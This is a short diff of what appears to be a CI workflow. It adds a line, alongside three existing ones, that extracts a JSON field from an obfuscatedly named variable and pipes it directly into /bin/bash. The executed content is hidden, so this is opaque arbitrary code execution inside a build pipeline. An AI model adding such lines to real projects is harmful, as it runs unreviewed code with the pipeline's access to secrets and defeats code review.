@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$trsii1739" | jq -r .mws59831 | /bin/bash
           printf '%s' "$vl1" | jq -r .yduqp75210 | /bin/bash
           echo $tnt55 | jq -r .wft723 | /bin/bash
+          printf '%s' "$qcao0" | jq -r .ff23 | /bin/bash
 
       - name: Archive output
         if: always()
